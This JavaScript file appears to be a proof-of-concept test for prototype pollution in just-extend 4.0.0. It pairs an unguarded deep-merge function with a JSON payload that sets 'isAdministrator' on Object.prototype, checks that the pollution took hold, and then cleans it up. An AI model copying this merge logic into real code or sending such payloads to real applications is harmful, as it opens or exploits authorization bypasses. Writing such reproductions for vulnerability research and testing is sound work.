function isCloneable(value) {
  return Array.isArray(value) ||
    Object.prototype.toString.call(value) === "[object Object]";
}

function representative400Extend(deep, target, ...sources) {
  for (const source of sources) {
    for (const key in source) {
      if (!Object.prototype.hasOwnProperty.call(source, key)) continue;
      const value = source[key];
      if (deep && isCloneable(value)) {
        const base = Array.isArray(value) ? [] : {};
        target[key] = representative400Extend(
          true,
          isCloneable(target[key]) ? target[key] : base,
          value,
        );
      } else {
        target[key] = value;
      }
    }
  }
  return target;
}

const patch = JSON.parse('{"__proto__":{"isAdministrator":true}}');
try {
  representative400Extend(true, {}, patch);
  if ({}.isAdministrator !== true) {
    throw new Error("just-extend 4.0.0 semantics did not modify Object.prototype");
  }
  console.log("just-extend 4.0.0 semantics modified Object.prototype");
} finally {
  delete Object.prototype.isAdministrator;
}
